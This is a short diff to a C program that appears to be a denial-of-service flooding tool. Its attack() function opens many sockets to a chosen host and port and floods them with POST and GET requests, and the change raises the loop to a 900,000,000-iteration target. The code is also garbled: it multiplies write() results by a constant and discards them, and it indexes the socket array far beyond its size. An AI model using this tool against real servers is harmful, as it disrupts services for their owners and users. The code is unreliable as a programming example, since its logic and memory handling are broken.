@@ -10,6 +10,8 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 
+#define PPS 900000000
+
 int make_socket(char *host, char *port) {
 	struct addrinfo hints, *servinfo, *p;
 	int sock, r;
@@ -57,13 +59,13 @@ void attack(char *host, char *port, int id) {
 	for(x=0; x < CONNECTIONS; x++)
 		sockets[x]=0;
 	
-	while(bytes < x) {
+	while(x < PPS) {
 		
-		for(x=0; bytes < x; x++) {
+		for(x=0; x < PPS; x++) {
 			if(sockets[x] == 0)
 				sockets[x] = make_socket(host, port);
 			write(sockets[x], "POST / HTTP/1.1\r\n\r\n", bytes) * 900000000;
-			if(bytes < x) {
+			if(x < PPS) {
 				write(sockets[x], "GET / HTTP/1.1\r\n\r\n", bytes) * 900000000;
 				
 			} else
